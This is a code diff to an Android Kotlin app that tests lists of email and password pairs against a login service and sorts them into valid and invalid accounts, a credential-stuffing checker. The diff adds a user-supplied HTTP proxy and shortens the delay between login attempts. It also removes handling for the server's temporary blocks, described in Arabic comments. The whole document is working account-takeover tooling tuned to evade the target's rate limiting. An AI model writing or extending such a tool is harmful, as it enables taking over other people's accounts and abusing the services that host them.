@@ -6,6 +6,7 @@ import android.os.Bundle
 import android.os.Environment
 import android.provider.MediaStore
 import android.widget.Button
+import android.widget.EditText
 import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
@@ -18,9 +19,13 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import okhttp3.*
 import java.io.File
+import java.net.InetSocketAddress
+import java.net.Proxy
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
+    private var proxyAddress: String? = null
+    
     private val cookieStore = mutableMapOf<String, MutableList<Cookie>>()
     private val cookieJar = object : CookieJar {
         override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) {
@@ -31,12 +36,25 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private val client = OkHttpClient.Builder()
-        .cookieJar(cookieJar)
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
-        .followRedirects(true)
-        .build()
+    private var client: OkHttpClient = OkHttpClient()
+    
+    private fun buildClient(proxy: String?): OkHttpClient {
+        val builder = OkHttpClient.Builder()
+            .cookieJar(cookieJar)
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .followRedirects(true)
+        
+        if (!proxy.isNullOrEmpty()) {
+            try {
+                val parts = proxy.replace("http://", "").split(":")
+                if (parts.size == 2) {
+                    builder.proxy(Proxy(Proxy.Type.HTTP, InetSocketAddress(parts[0], parts[1].toInt())))
+                }
+            } catch (e: Exception) {}
+        }
+        return builder.build()
+    }
         
     private val results = mutableListOf<Triple<String, String, String>>()
     private var combos: List<Pair<String, String>> = emptyList()
@@ -61,8 +79,15 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
         log = findViewById(R.id.log)
         status = findViewById(R.id.status)
+        
+        val proxyInput = findViewById<EditText>(R.id.proxyInput)
+        
         findViewById<Button>(R.id.pick).setOnClickListener { pickFile.launch(arrayOf("*/*")) }
-        findViewById<Button>(R.id.start).setOnClickListener { runCheck() }
+        
+        findViewById<Button>(R.id.start).setOnClickListener { 
+            proxyAddress = proxyInput.text.toString().trim().ifEmpty { null }
+            runCheck() 
+        }
     }
 
     private fun runCheck() {
@@ -72,6 +97,8 @@ class MainActivity : AppCompatActivity() {
         }
         results.clear()
         log.text = ""
+        client = buildClient(proxyAddress)
+        
         lifecycleScope.launch {
             val total = combos.size
             var done = 0
@@ -82,19 +109,10 @@ class MainActivity : AppCompatActivity() {
             for ((index, combo) in combos.withIndex()) {
                 val (email, pwd) = combo
                 
-                // تأخير ثابت بين كل حساب
-                delay(5000) 
+                // تأخير 4 ثواني
+                delay(4000) 
                 
-                var (st, detail) = checkOne(email, pwd)
-                
-                // لو السيرفر حظرنا، نستنى دقيقة ونحاول تاني
-                if (st == "error" && (detail.contains("429") || detail.contains("no_csrf"))) {
-                    log.append("--- حظر مؤقت! استراحة دقيقة... ---\n")
-                    delay(60000)
-                    val retry = checkOne(email, pwd)
-                    st = retry.first
-                    detail = retry.second
-                }
+                val (st, detail) = checkOne(email, pwd)
                 
                 results.add(Triple(email, pwd, st))
                 when (st) {
@@ -156,7 +174,7 @@ class MainActivity : AppCompatActivity() {
                     } else if (body.contains("invalid") || body.contains("credentials") || body.contains("password")) {
                         "invalid" to "wrong_pass"
                     } else {
-                        "invalid" to "unknown_resp_${r.code}"
+                        "invalid" to "unknown_${r.code}"
                     }
                 }
             } catch (e: Exception) {
